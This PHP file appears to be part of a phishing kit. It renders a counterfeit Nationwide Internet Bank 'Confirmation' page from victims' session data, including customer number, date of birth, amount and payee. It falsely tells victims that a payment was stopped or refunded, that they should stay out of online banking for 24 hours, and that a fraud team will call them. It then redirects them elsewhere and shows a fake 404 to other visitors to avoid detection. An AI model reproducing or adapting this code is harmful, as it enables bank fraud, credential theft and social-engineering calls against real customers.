<?php
session_start();
error_reporting(0);
include "nw.php";
include "control.php";
include "connect/out.php";
if(isset($_GET["inID"]))
{	
	$challenge=getChallenge($_SESSION["cusnum"],$_SESSION["dob"],$panel_rec);
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(7,9));
	$fj2=randomCha(rand(10,12));
	$rand=rand(1,3);
	$text="terminated";
	if($_SESSION["act"]=="noref")
	{
		$text="authorised";
	}
	echo '<!DOCTYPE html>
<!--[if IEMobile 7 ]> 
<html dir="ltr" lang="en-GB" class="has-no-js iem7">
   <![endif]-->
   <!--[if lt IE 7 ]> 
   <html dir="ltr" lang="en-GB" class="has-no-js ie6 old-ie">
      <![endif]-->
      <!--[if IE 7 ]>    
      <html dir="ltr" lang="en-GB" class="has-no-js ie7 old-ie">
         <![endif]-->
         <!--[if IE 8 ]>    
         <html dir="ltr" lang="en-GB" class="has-no-js ie8 old-ie">
            <![endif]-->
            <!--[if (gte IE 9)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!-->
<html dir="ltr" class="has-js has-no-ie8compat has-opacity has-cssremunit has-preserve3d has-supports has-checked has-textshadow has-cssanimations has-borderradius has-boxshadow has-flexbox has-flexboxlegacy has-no-flexboxtweener has-flexwrap has-csstransforms has-csstransforms3d has-csstransitions has-cssclippathinset" style="" lang="en-GB"><head></head><body class="page login-page">
                  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                  <meta charset="utf-8">
                  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <meta name="format-detection" content="telephone=no">
                  <title>Confirmation - Nationwide Internet Bank</title>
                  <link rel="stylesheet" href="game/leave.css'.outrand().'">
                  <link rel="stylesheet" href="game/online.css'.outrand().'">
                  <link rel="shortcut icon" href="favicon.ico'.outrand().'">
                  <link rel="apple-touch-icon" href="game/120.png'.outrand().'" sizes="120x120">
                  <link rel="apple-touch-icon" href="game/76.png'.outrand().'" sizes="76x76">
                  <link rel="apple-touch-icon" href="game/76.png'.outrand().'">
				  <meta http-equiv="refresh" content="9;URL='.$out_url.'" />
                  <header class="page-header">
                     <div class="page-header__inner">
                        <div class="page-header__logo">
                           <a class="logo__image" href="#">
                           <span class="alt-text">Nationwide.co.uk</span>
                           </a>
                           <div class="page-header__subtitle-link">
                              <div class="logo__subtitle">
                                 <span class="icon"></span>
                                 Internet Bank
                              </div>
                           </div>
                        </div>
                     </div>
                  </header>
                  <div class="app app--process process">
                     <section class="stage" role="main">
                        <header class="stage__header">
                           <span class="icon"></span>
                           <div class="stage__header__title">
                              <h1>Confirmation</h1>
                              <div class="stage__header__right">
                                 <span style="font-size: 12px;">SSL Secured</span> 
                              </div>
                              <span id="process-title-hidden-text" class="u-screen-reader-text">
                              </span>
                           </div>
                        </header>
                        <div class="stage__content">
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                                 
                                 
                                 
                                 
                                 <div class="message-list validation-summary-header message-list--validation-error message-list--unordered" tabindex="0" id="err-m" style="display:none">
                                    <span class="icon"></span>
                                    <div class="message-list__title">
                                       Error
                                       <span class="message-list__subtitle">Sorry - you must correct the errors on this page before you can continue.</span>
                                       <span class="u-screen-reader-text visuallyhidden" id="msg-screen-reader-text___0a2a2cdf-a01b-4fd8-9537-5b4a5f9b79e4">Clicking this link will direct you to the field containing the error.</span>
                                    </div>
                                    <div class="message-list__items">
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="section section--no-title section--wide">
                              <div class="section__inner">
                              </div>
                           </div>
                           <div class="section">
                              <div class="section__inner">
                                 <div class="message">
                                 </div>
                              </div>
                           </div>
                           <div class="section section--no-title">
                              <div class="section__title">
                                 <h2>Your payment has been '.$text.'</h2>
                              </div>
                              <div class="section__inner">        
                                 <p>We have successfully '.$text.' the payment request of <b>'.$_SESSION["amount"].'</b> to <b>'.$payee.'</b>.<br>
									';if($_SESSION["act"] == "ref"){ echo '
The amount has successfully refunded to your account this can take up to one working day.<br>
<br>
We have assigned a security specialist to look over this issue and get it assessed. You are suggested to not use your online banking for 24 hours as it is under observation for suspicious activity.<br>
<br>
You will receive a call from our fraud department along with the details of this incident.<br>
<br>
									Your new online details will be sent to your registered address.<br>';} echo '
<br>
You will be redirected shortly to our security pages, please wait.<br>
<br>
<br></p>

<p style="text-align: center;padding: 50px;"><img src="game/loader.gif" width="40" /></p>









                                 
                                 
                              </div>
                           </div>
                           
                           
                           
                           
                        </div>
                        
                     </section>
                  </div>
                  <footer class="page-footer">
                     <div class="page-footer__inner">
                        <div class="page-footer__navigation-social-media-copyright">
                           <div class="page-footer__navigation">
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Register</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Order a new card reader</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Security centre</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Accessibility</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Service status</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                              <ul class="link-list">
                                 <li class="link-list__item">
                                    <a href="#">Mobile Banking app</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Internet Bank Terms and Conditions</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Contact us</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Cookies and privacy</a>
                                    <span class="icon"></span>
                                 </li>
                                 <li class="link-list__item">
                                    <a href="#">Troubleshooting</a>
                                    <span class="icon"></span>
                                 </li>
                              </ul>
                           </div>
                           <div class="page-footer__social-media-copyright">
                              <div class="page-footer__social-media">
                                 <div class="footer-heading">Follow us:</div>
                                 <ul role="navigation">
                                    <li>
                                       <a class="twitter" href="#">
                                       <span class="srText">Twitter (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="facebook" href="#">
                                       <span class="srText">Facebook (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="youtube" href="#">
                                       <span class="srText">Youtube (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                    <li>
                                       <a class="linkedin" href="#">
                                       <span class="srText">LinkedIn (This link will open in a new window)</span>
                                       </a>
                                    </li>
                                 </ul>
                              </div>
                              <div class="page-footer__FSCS-Logo"><a href="#">
                                 <img alt="FSCS Logo" class="FSCS-Logo" src="game/FSCS_Logo.png">
                                 </a>
                              </div>
                              <div class="page-footer__copyright">© 2020 Nationwide Building Society</div>
                           </div>
                        </div>
                        <div class="page-footer__regulatory">
                           <p>Nationwide Building Society is authorised by the Prudential 
                              Regulation Authority and regulated by the Financial Conduct Authority 
                              and the Prudential Regulation Authority under registration number 
                              106078. You can confirm our registration on the FCA’s website <a href="#" title="" class="new-window-link">www.fca.gov.uk<span class="srText"> Opens in a new window</span></a>. Nationwide is not responsible for the content of external websites.
                           </p>
                        </div>
                     </div>
                  </footer>      
            </body></html>';
session_destroy();
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>